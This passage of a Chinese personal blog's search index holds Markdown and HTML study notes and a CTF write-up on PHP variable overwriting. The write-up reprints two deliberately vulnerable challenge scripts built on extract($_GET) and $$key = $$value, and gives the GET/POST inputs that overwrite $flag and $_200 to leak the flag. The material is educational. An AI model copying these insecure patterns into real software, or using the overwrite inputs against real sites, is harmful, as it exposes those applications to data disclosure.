https://lll-nnn.github.io/</code>  </p><hr><h2 id="Markdown插入图片"><a href="#Markdown插入图片" class="headerlink" title="Markdown插入图片"></a>Markdown插入图片</h2><p>格式： <code>![alt 属性文本](图片地址 &quot;可选标题&quot;)</code><br>或者 像超链接那样使用变量。<br>可以使用<code>&lt;img src=&quot;url&quot; width=&quot;300&quot; heigth=&quot;300&quot;</code>设定宽度和高度<br>附：获得本地照片网络地址（url）的方法：     </p><ol><li>通过百度识图上传然后右键上传的图片查看地址。    </li><li>最好创建一个图床。图床创建方式：<a href="https://www.jianshu.com/p/d51258ef5484">https://www.jianshu.com/p/d51258ef5484</a>  </li><li>xxxx.md 引入图片时，先把图片复制到xxxx文件夹中 然后在xxxx.md中按照markdown的格式引入图片：<br><code>![你想输入的替代文字](xxxx/图片名.jpg)</code></li></ol><p><code>![鬼刀](http://m.qpic.cn/psc?/V12Z3Zad2KK0gc/45NBuzDIW489QBoVep5mcZqHcWkXe5o2wOT*Z7lw4p5ynCBBo4qwUhcEBh9*mzSxtF4uyLYKqlixt3qQ11yt9FuqEyqhMI0.2Bu7NyxK6UU!/b&amp;bo=IAMIAiADCAIBFzA!&amp;rf=viewer_4)</code><br><img src="https://ftp.bmp.ovh/imgs/2020/11/1498818c58bca487.jpg"></p><hr><h2 id="Markdown表格"><a href="#Markdown表格" class="headerlink" title="Markdown表格"></a>Markdown表格</h2><p>使用<code>|</code>来分隔不同的单元格，使用<code>-</code>来分隔表头和其他行。<br> |表头 | 表头|<br>|  -  | - |<br>| 单元格  | 单元格 |<br>| 单元格  | 单元格 |<br>表格似乎不能用啊？？？<br>等找到解决办法再写吧。。。    </p><hr><p>另外还有一些高级技巧，感觉也用不到，等用到时再写吧。</p>]]></content>
    
    
    <categories>
      
      <category>NOTE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>NOTE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Php变量覆盖</title>
    <link href="/2020/11/26/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96WP/"/>
    <url>/2020/11/26/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96WP/</url>
    
    <content type="html"><![CDATA[<h1 id="php变量覆盖1"><a href="#php变量覆盖1" class="headerlink" title="php变量覆盖1"></a>php变量覆盖1</h1><hr><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><pre><code>&lt;html&gt;&lt;head&gt;&lt;title&gt;php-extract&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;&lt;font color=&quot;red&quot;&gt;please use &lt;font color=&quot;blue&quot;&gt;`ctrl+u`&lt;/font&gt; to see the source code&lt;/font&gt;&lt;/p&gt;&lt;article&gt;$flag=&#39;xxxxxxxx&#39;;extract($_GET);           ////extract()函数将GET到的字符作为变量if(isset($liwu)) &#123;    $content=trim(file_get_contents($flag));          ////file_get_contents() 把整个文件读入$content中。trim()移除字符串两侧的字符。    if($liwu==$content) &#123;        echo&#39;flag&#123;xxxxxxxxxxx&#125;&#39;;    &#125;    else &#123;        echo &#39;please try other operation.&#39;;    &#125;&#125;?&gt;&lt;/article&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>题目的意思是以GET方式输入liwu，经过extract函数后当作变量，将其与$content对比，若相等，则输出flag。<br>以GET方式输入 <strong>liwu&amp;flag=1</strong>这样就覆盖了一开始flag的值，$liwu和$content两个变量也会相等，就能得到flag了。<br><img src="https://ftp.bmp.ovh/imgs/2020/11/85d734f646fc46e9.png">   </p><hr><h2 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h2><ul><li>这道题属于extract()函数变量覆盖。</li><li>extract()函数将GET到的字符作为变量。</li><li>file_get_contents()函数把整个文件读入一个字符串中。</li><li>trim()函数移除字符串两侧的空白字符或其他预定义字符。<ul><li>至于本题为什么要用这个函数，可能是因为本来的flag含有空格或其他字符吧。   </li></ul></li></ul><hr><h1 id="php变量覆盖2"><a href="#php变量覆盖2" class="headerlink" title="php变量覆盖2"></a>php变量覆盖2</h1><hr><h2 id="WP-1"><a href="#WP-1" class="headerlink" title="WP"></a>WP</h2><p>还是先代码审计：     </p><pre><code>&lt;?phphighlight_file(__FILE__);include &quot;flag.php&quot;;$_403 = &quot;拒绝访问&quot;;$_200 = &quot;欢迎~~~&quot;;if ($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;)    die(&quot;sssssssspost…&quot;);     ////表明输入请求的方式应该为POSTif ( !isset($_POST[&quot;flag&quot;]) )    die($_403);        ////判断是否通过POST提交了flag变量foreach ($_GET as $key =&gt; $value)      ////foreach()就是for循环    $$key = $$value;  ////$_GET键名赋给$key,键值赋给$value,经过$$key = $$value后GET的就会变为变量foreach ($_POST as $key =&gt; $value)    $$key = $value;if ( $_POST[&quot;flag&quot;] !== $flag )    die($_403);echo &quot;This is your flag : &quot;. $flag . &quot;\n&quot;;die($_200);      ?&gt;                       </code></pre><p>最后输出的是$_200 = “欢迎~~~”；而flag没有输出方式，所以将$_200的值变成flag就能得到flag了。<br>GET传入_200=flag,经过for循环就会变成$_200=$flag,这样就把flag给$_200了，最后再POST个flag的值，让它不等$flag就能输出flag了。<br> <img src="https://ftp.bmp.ovh/imgs/2020/11/067bd0d3e477579e.png">       </p><hr><h2 id="知识点总结-1"><a href="#知识点总结-1" class="headerlink" title="知识点总结"></a>知识点总结</h2><ul><li>这道题属于**$$**变量覆盖问题。</li><li>主要是for循环中：$_GET键名赋给$key,键值赋给$value,经过$$key = $$value后GET的就会变为变量。弄懂这个，这道题就出来了。</li></ul>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTML基础学习笔记</title>
    <link href="/2020/11/24/html/"/>
    <url>/2020/11/24/html/</url>
    
    <content type="html"><![CDATA[<h2 id="HTML基础"><a href="#HTML基础" class="headerlink" title="HTML基础"></a>HTML基础</h2><h3 id="html标题"><a href="#html标题" class="headerlink" title="html标题"></a>html标题</h3><p>html标题通过<br><code>&lt;h1&gt;最大标题&lt;/h1&gt;</code><br><code>&lt;h2&gt;&lt;/h2&gt;</code><br>…………<br><code>&lt;h6&gt;最小标题&lt;/h6&gt;</code><br>这些标签来定义。   </p><h3 id="html段落"><a href="#html段落" class="headerlink" title="html段落"></a>html段落</h3><p>html段落通过标签<code>&lt;p&gt;一个段落&lt;/p&gt;</code>定义。   </p><h3 id="html链接"><a href="#html链接" class="headerlink" title="html链接"></a>html链接</h3><p>html链接通过标签<code>&lt;a&gt;&lt;/a&gt;</code>定义。<br><code>&lt;a href=&quot;https://lll-nnn.github.io/&quot; target=&quot;_blank&quot;&gt;lll-nnnのblog&lt;/a&gt;</code>   </p><h3 id="html图像"><a href="#html图像" class="headerlink" title="html图像"></a>html图像</h3><p>html图像通过标签<code>&lt;img&gt;</code>定义。<br><code>&lt;img src=&quot;url&quot; &gt;</code></p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;style&gt;     body &#123;background-color:gainsboro&#125;&lt;/style&gt;&lt;base href=&quot;https://lll-nnn.github.io/&quot; target=&quot;_blank&quot;&gt;   &lt;!--target=&quot;_blank&quot;   在新窗口打开文档--&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt; HTML STUDY&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;一级标题&lt;/h1&gt;&lt;h2&gt;二级标题&lt;/h2&gt;&lt;h6&gt;最后一级标题&lt;/h6&gt;&lt;p&gt;段落&lt;/p&gt;&lt;!--HTML链接--&gt;&lt;a href=&quot;https://lll-nnn.github.io/&quot; target=&quot;_blank&quot; rel=&quot;myself&quot;&gt;lll-nnnのblog&lt;/a&gt;     &lt;!--rel用于指定当前文档与被连接文档的关系--&gt;&lt;!--HTML图像--&gt;&lt;img src=&quot;C:\Users\ASUS\OneDrive\桌面\paper\guidao.jpg&quot; ait=&quot;guidao&quot; width=&quot;800&quot; height=&quot;800&quot;&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://ftp.bmp.ovh/imgs/2020/11/55f7b2cabe9b8915.png"></p>]]></content>
    
    
    <categories>
      
      <category>NOTE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>NOTE</tag>
      
    </tags>
    
  </entry>
  
  
  
  
  
  
  <entry>
    <title>404</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>关于</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>About</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>Categories</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>分类</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>Categories</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>Html</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>标签</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>Tags</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>Friends</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
</search>
